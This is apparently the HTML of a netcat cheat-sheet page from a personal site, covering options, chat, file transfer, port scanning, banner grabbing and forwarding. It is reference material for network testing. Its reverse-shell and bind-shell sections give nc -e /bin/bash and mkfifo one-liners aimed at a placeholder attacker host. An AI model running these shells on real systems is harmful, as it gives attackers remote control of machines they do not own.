@@ -1,0 +1,643 @@
+<!doctype html>
+<html lang="fr" data-theme="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
+  
+    
+  
+    
+  
+  <title>netcat · /void !</title>
+  
+  <meta name="description" content="">
+
+  
+    <link rel="canonical" href="https://upcreid.github.io/cheat-sheet/netcat/">
+  
+  
+    
+    
+      
+        
+      
+    
+    <link rel="alternate" hreflang="fr" href="https://upcreid.github.io/cheat-sheet/netcat/">
+  
+    
+    
+      
+        
+      
+    
+    <link rel="alternate" hreflang="en" href="/en/">
+  
+  <link rel="icon" href="https://upcreid.github.io/images/logo.png">
+  <link rel="stylesheet" href="https://upcreid.github.io/css/style.css">
+  <link rel="alternate" type="application/atom+xml" title="/void !" href="https://upcreid.github.io/atom.xml">
+  <script>
+    (function () {
+      var stored = null;
+      try { stored = localStorage.getItem('theme'); } catch (e) {}
+      var prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      document.documentElement.dataset.theme = stored || (prefersDark ? 'dark' : 'light');
+    })();
+  </script>
+  
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <header class="header">
+    <div class="header__inner">
+      <a class="brand" href="/">
+        <img class="brand__logo" src="https://upcreid.github.io/images/logo.png" alt="" width="32" height="32">
+        <span class="brand__name">/void !</span>
+      </a>
+
+      <nav class="tabs" aria-label="Menu">
+        
+        
+          
+        
+          
+        
+        
+          
+          
+          
+            
+            
+              
+            
+          
+          <a class="tabs__link" href="https://upcreid.github.io/"
+             >Accueil</a>
+        
+          
+          
+          
+            
+            
+              
+            
+          
+          <a class="tabs__link" href="https://upcreid.github.io/blog/"
+             >Blog</a>
+        
+          
+          
+          
+            
+            
+              
+            
+          
+          <a class="tabs__link tabs__link--active" href="https://upcreid.github.io/cheat-sheet/"
+             aria-current="page">Aide-mémoire</a>
+        
+          
+          
+          
+            
+            
+              
+            
+          
+          <a class="tabs__link" href="https://upcreid.github.io/games/"
+             >Jeux</a>
+        
+      </nav>
+
+      <div class="header__tools">
+        <button class="icon-button" type="button" data-search-toggle aria-label="Rechercher" aria-expanded="false">
+          <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.5 6.5 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2A4.5 4.5 0 0 0 5 9.5 4.5 4.5 0 0 0 9.5 14 4.5 4.5 0 0 0 14 9.5 4.5 4.5 0 0 0 9.5 5Z"/></svg>
+        </button>
+
+        <button class="icon-button" type="button" data-theme-toggle aria-label="Changer de thème">
+          <svg class="icon-sun" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M3.55 19.09 2.46 18l1.79-1.8 1.1 1.1zM12 23a1 1 0 0 1-1-1v-3a1 1 0 0 1 2 0v3a1 1 0 0 1-1 1m7.45-3.91-1.1-1.1 1.8-1.79 1.09 1.09zM20 13h3v-2h-3zm-8-2a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 6a2 2 0 0 1-2-2 2 2 0 0 1 2-2 2 2 0 0 1 2 2 2 2 0 0 1-2 2M1 13v-2h3v2zm3.55-8.09L2.46 6l1.79 1.8 1.1-1.1zM12 1a1 1 0 0 1 1 1v3a1 1 0 0 1-2 0V2a1 1 0 0 1 1-1m7.45 6.91-1.1-1.1 1.8-1.79 1.09 1.09z"/></svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M17.75 4.09l-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.19-3L14.82 4zm5.91 12.91-1.97 1.66.69 2.33-2.01-1.38-2 1.38.69-2.33-1.67-1.31 2.24-.15L20.8 14l.94 2.35zm-15.44.98L6.25 19.4l.98 3.48-2.79-2-2.79 2 .98-3.48-1.97-1.42h2.26L4.18 15zM5.5 2.5l1.06 2.62 2.44.1-1.9 1.5.61 2.38L5.5 7.86 3.79 9.1l.61-2.38-1.9-1.5 2.44-.1z"/></svg>
+        </button>
+
+        <div class="lang-switch" data-lang-switch>
+          <button class="lang-switch__button" type="button" aria-label="Langue" aria-expanded="false">
+            <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+          </button>
+          <div class="lang-switch__menu">
+            
+              
+              
+                
+                  
+                
+              
+              <a class="lang-switch__item lang-switch__item--active" href="https://upcreid.github.io/cheat-sheet/netcat/"
+                 hreflang="fr" aria-current="true">Français</a>
+            
+              
+              
+                
+                  
+                
+              
+              <a class="lang-switch__item" href="/en/"
+                 hreflang="en" >English</a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="search-panel" data-search-panel data-search-sources="/search_index.fr.json,/search_index.en.json"
+         data-search-empty="Aucun résultat" hidden>
+      <div class="search-panel__inner">
+        <input class="search-panel__input" type="search" data-search-input
+               placeholder="Rechercher…" autocomplete="off" aria-label="Rechercher">
+        <ul class="search-panel__results" data-search-results></ul>
+      </div>
+    </div>
+  </header>
+
+  
+  <main id="main" class="main">
+    
+    <div class="layout layout--with-sidebar layout--with-toc">
+      
+  
+  
+    
+    
+      <aside class="sidebar">
+        <nav class="sidebar__nav">
+          <p class="sidebar__title">Aide-mémoire</p>
+          <ul class="sidebar__list">
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/python-build/">Python Build</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/fastapi/">FastAPI</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/golang/">Go (Golang)</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/hugo/">Hugo</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/csharp-dotnet/">C# &amp; .NET</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/docker/">Docker</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/kubectl/">Kubectl</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/k9s/">K9s</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/git/">Git</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/grafana/">Grafana</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/prometheus/">Prometheus</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/linux-filesystem/">Linux File System</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/shell/">Shell</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/curl/">curl</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link sidebar__link--active"
+                   href="https://upcreid.github.io/cheat-sheet/netcat/">netcat</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/ansible/">Ansible</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/slidev/">Slidev</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/sql/">SQL</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/tmux/">Tmux</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/vagrant/">Vagrant</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/terraform/">Terraform</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/vim/">Vim</a>
+              </li>
+            
+              <li>
+                <a class="sidebar__link"
+                   href="https://upcreid.github.io/cheat-sheet/macos-filesystem/">Macos File System</a>
+              </li>
+            
+          </ul>
+        </nav>
+      </aside>
+    
+  
+
+      <article class="content">
+        
+  
+  
+  
+    
+    
+      
+    
+  
+  
+    
+    
+  
+    
+    
+      
+    
+  
+
+  <nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="https://upcreid.github.io/">Accueil</a>
+    
+      
+      
+    
+      
+      
+        <span class="breadcrumbs__sep">/</span>
+        <a href="https://upcreid.github.io/cheat-sheet/">Aide-mémoire</a>
+      
+    
+  </nav>
+
+  <h1>netcat</h1>
+
+  <p class="page-meta">
+    
+    <span>3 min de lecture</span>
+    
+    
+  </p>
+
+  
+
+  <div class="prose" lang="en">
+    <blockquote>
+<p><strong>Filename suggestion:</strong> <code>NETCAT_CHEATSHEET.md</code><br />
+<strong>Netcat</strong> — the “Swiss army knife” of networking. Use it to read/write data across network connections using TCP or UDP.<br />
+<strong>Security note:</strong> Commands that open shells, forward ports, or transfer data must be used <strong>only</strong> on systems you own or are authorized to test.</p>
+</blockquote>
+<hr />
+<h2 id="gear-basic-syntax">⚙️ Basic syntax<a class="zola-anchor" href="#gear-basic-syntax" aria-label="Anchor link for: gear-basic-syntax">🔗</a></h2>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="plain"><span class="giallo-l"><span>nc [options] [host] [port]</span></span></code></pre>
+<hr />
+<h2 id="common-options-varies-by-implementation-gnu-netcat-openbsd-netcat-ncat">� Common options (varies by implementation: GNU netcat, OpenBSD netcat, Ncat)<a class="zola-anchor" href="#common-options-varies-by-implementation-gnu-netcat-openbsd-netcat-ncat" aria-label="Anchor link for: common-options-varies-by-implementation-gnu-netcat-openbsd-netcat-ncat">🔗</a></h2>
+<table><thead><tr><th>Option</th><th>Meaning</th></tr></thead><tbody>
+<tr><td><code>-l</code></td><td>Listen mode (server)</td></tr>
+<tr><td><code>-p &lt;port&gt;</code></td><td>Local port (used with <code>-l</code>)</td></tr>
+<tr><td><code>-u</code></td><td>Use UDP (default is TCP)</td></tr>
+<tr><td><code>-v</code> / <code>-vv</code></td><td>Verbose / very verbose</td></tr>
+<tr><td><code>-n</code></td><td>Numeric-only (no DNS lookups)</td></tr>
+<tr><td><code>-z</code></td><td>Zero-I/O mode — for port scanning (no data sent)</td></tr>
+<tr><td><code>-w &lt;sec&gt;</code></td><td>Timeout for connects and final net reads</td></tr>
+<tr><td><code>-e &lt;program&gt;</code></td><td>Execute program after connect (often disabled for security)</td></tr>
+<tr><td><code>-k</code></td><td>Keep listening after client disconnects (use with <code>-l</code>)</td></tr>
+<tr><td><code>-q &lt;sec&gt;</code></td><td>Quit after EOF on stdin and specified delay (GNU netcat)</td></tr>
+<tr><td><code>-s &lt;addr&gt;</code></td><td>Use specific source address</td></tr>
+<tr><td><code>-C</code></td><td>Send CRLF as line-ending (some variants)</td></tr>
+<tr><td><code>-S</code></td><td>TCP MD5 signature (rare/specialized)</td></tr>
+<tr><td><code>-X</code> / <code>-x</code></td><td>Proxy options (in some builds)</td></tr>
+</tbody></table>
+<blockquote>
+<p><strong>Note:</strong> Flags differ between implementations (OpenBSD <code>nc</code>, GNU <code>netcat</code>, Ncat from Nmap). Check <code>man nc</code> / <code>nc --help</code> for your version.</p>
+</blockquote>
+<hr />
+<h2 id="simple-client-connection">� Simple client connection<a class="zola-anchor" href="#simple-client-connection" aria-label="Anchor link for: simple-client-connection">🔗</a></h2>
+<p>Connect to a host/port:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> example.com</span><span style="color: light-dark(#005CC5, #79B8FF);"> 80</span></span></code></pre>
+<p>Use it to send raw requests (HTTP, SMTP, etc.):</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="plain"><span class="giallo-l"><span>GET / HTTP/1.1</span></span>
+<span class="giallo-l"><span>Host: example.com</span></span>
+<span class="giallo-l"></span></code></pre>
+<hr />
+<h2 id="simple-server-chat-demo">�️ Simple server (chat/demo)<a class="zola-anchor" href="#simple-server-chat-demo" aria-label="Anchor link for: simple-server-chat-demo">🔗</a></h2>
+<p><strong>Server (listen):</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 1234</span></span></code></pre>
+<p><strong>Client (connect):</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> 192.168.1.100</span><span style="color: light-dark(#005CC5, #79B8FF);"> 1234</span></span></code></pre>
+<p>Type messages between terminals.</p>
+<hr />
+<h2 id="file-transfer-tcp">� File transfer (TCP)<a class="zola-anchor" href="#file-transfer-tcp" aria-label="Anchor link for: file-transfer-tcp">🔗</a></h2>
+<p><strong>Sender (server)</strong> — listen and send file to the first client that connects:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.tar.gz</span></span></code></pre>
+<p><strong>Receiver (client)</strong> — connect and write to disk:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);">server_i</span><span>p</span><span style="color: light-dark(#D73A49, #F97583);">&gt;</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &gt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.tar.gz</span></span></code></pre>
+<p><strong>With progress (pv):</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">pv</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.tar.gz</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> client</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> server_ip</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &gt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.tar.gz</span></span></code></pre>
+<hr />
+<h2 id="udp-examples">� UDP examples<a class="zola-anchor" href="#udp-examples" aria-label="Anchor link for: udp-examples">🔗</a></h2>
+<p><strong>Listen on UDP port 9999:</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">u</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 9999</span></span></code></pre>
+<p><strong>Send UDP datagram:</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#005CC5, #79B8FF);">echo</span><span style="color: light-dark(#032F62, #9ECBFF);"> &quot;</span><span style="color: light-dark(#032F62, #9ECBFF);">hello</span><span style="color: light-dark(#032F62, #9ECBFF);">&quot;</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">u</span><span style="color: light-dark(#032F62, #9ECBFF);"> target_ip</span><span style="color: light-dark(#005CC5, #79B8FF);"> 9999</span></span></code></pre>
+<p>Note: UDP is connectionless — ordering and delivery are not guaranteed.</p>
+<hr />
+<h2 id="port-scanning-quick">� Port scanning (quick)<a class="zola-anchor" href="#port-scanning-quick" aria-label="Anchor link for: port-scanning-quick">🔗</a></h2>
+<p>Scan ports 20–1024:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">zv</span><span style="color: light-dark(#005CC5, #79B8FF);"> 192.168.1.1</span><span style="color: light-dark(#032F62, #9ECBFF);"> 20-1024</span></span></code></pre>
+<p><code>-z</code> = zero I/O (no data); <code>-v</code> = verbose (shows open/closed).<br />
+For more advanced scanning use <code>nmap</code>.</p>
+<hr />
+<h2 id="banner-grabbing-service-detection">� Banner grabbing / service detection<a class="zola-anchor" href="#banner-grabbing-service-detection" aria-label="Anchor link for: banner-grabbing-service-detection">🔗</a></h2>
+<p>Grab an SMTP banner:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">nv</span><span style="color: light-dark(#032F62, #9ECBFF);"> mail.example.com</span><span style="color: light-dark(#005CC5, #79B8FF);"> 25</span></span></code></pre>
+<p>Grab HTTP headers:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#005CC5, #79B8FF);">echo</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">e</span><span style="color: light-dark(#032F62, #9ECBFF);"> &quot;</span><span style="color: light-dark(#032F62, #9ECBFF);">HEAD / HTTP/1.0\r\n\r\n</span><span style="color: light-dark(#032F62, #9ECBFF);">&quot;</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">nv</span><span style="color: light-dark(#032F62, #9ECBFF);"> example.com</span><span style="color: light-dark(#005CC5, #79B8FF);"> 80</span></span></code></pre>
+<hr />
+<h2 id="reverse-shell-for-lab-testing-only">� Reverse shell (for lab/testing only)<a class="zola-anchor" href="#reverse-shell-for-lab-testing-only" aria-label="Anchor link for: reverse-shell-for-lab-testing-only">🔗</a></h2>
+<p><strong>Attacker (listener):</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span></span></code></pre>
+<p><strong>Target (connect back):</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);">attacker_i</span><span>p</span><span style="color: light-dark(#D73A49, #F97583);">&gt;</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">e</span><span style="color: light-dark(#032F62, #9ECBFF);"> /bin/bash</span></span></code></pre>
+<blockquote>
+<p>Many <code>nc</code> builds (e.g., OpenBSD) disable <code>-e</code>. Alternative using FIFO:</p>
+</blockquote>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">mkfifo</span><span style="color: light-dark(#032F62, #9ECBFF);"> /tmp/f</span><span>;</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);">attacker_i</span><span>p</span><span style="color: light-dark(#D73A49, #F97583);">&gt;</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> /tmp/f</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> /bin/sh</span><span style="color: light-dark(#D73A49, #F97583);"> &gt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> /tmp/f</span><span style="color: light-dark(#D73A49, #F97583);"> 2</span><span style="color: light-dark(#D73A49, #F97583);">&gt;&amp;1</span><span>;</span><span style="color: light-dark(#6F42C1, #B392F0);"> rm</span><span style="color: light-dark(#032F62, #9ECBFF);"> /tmp/f</span></span></code></pre>
+<hr />
+<h2 id="bind-shell-listen-on-target">� Bind shell (listen on target)<a class="zola-anchor" href="#bind-shell-listen-on-target" aria-label="Anchor link for: bind-shell-listen-on-target">🔗</a></h2>
+<p><strong>On target:</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">e</span><span style="color: light-dark(#032F62, #9ECBFF);"> /bin/bash</span></span></code></pre>
+<p><strong>On attacker:</strong></p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);">target_i</span><span>p</span><span style="color: light-dark(#D73A49, #F97583);">&gt;</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span></span></code></pre>
+<blockquote>
+<p>Bind shells expose a listening service on the target — can be blocked by firewalls.</p>
+</blockquote>
+<hr />
+<h2 id="port-forwarding-proxying-simple">� Port forwarding / proxying (simple)<a class="zola-anchor" href="#port-forwarding-proxying-simple" aria-label="Anchor link for: port-forwarding-proxying-simple">🔗</a></h2>
+<p>Netcat alone doesn’t do robust transparent proxying, but you can chain connections:</p>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Forward local port 8080 to remote host:80 via an intermediate host</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> On intermediate host:</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">mkfifo</span><span style="color: light-dark(#032F62, #9ECBFF);"> backpipe</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 8080</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> backpipe</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> target_host</span><span style="color: light-dark(#005CC5, #79B8FF);"> 80</span><span style="color: light-dark(#D73A49, #F97583);"> &gt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> backpipe</span></span></code></pre>
+<p>For production-grade port forwarding use <code>ssh -L</code>/<code>ssh -R</code>, <code>socat</code>, or dedicated proxies.</p>
+<hr />
+<h2 id="misc-useful-commands">� Misc useful commands<a class="zola-anchor" href="#misc-useful-commands" aria-label="Anchor link for: misc-useful-commands">🔗</a></h2>
+<ul>
+<li><strong>Repeat last command</strong>: use shell history (<code>!!</code>) not nc-specific.</li>
+<li><strong>Show local listening ports</strong>: <code>ss -tuln</code> or <code>netstat -tuln</code>.</li>
+<li><strong>Combine with <code>openssl</code></strong> for TLS:</li>
+</ul>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Server: listen and upgrade to TLS (requires openssl and cert/key)</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">openssl</span><span style="color: light-dark(#032F62, #9ECBFF);"> s_server</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">accept</span><span style="color: light-dark(#005CC5, #79B8FF);"> 8443</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">cert</span><span style="color: light-dark(#032F62, #9ECBFF);"> cert.pem</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">key</span><span style="color: light-dark(#032F62, #9ECBFF);"> key.pem</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">quiet</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Client:</span></span>
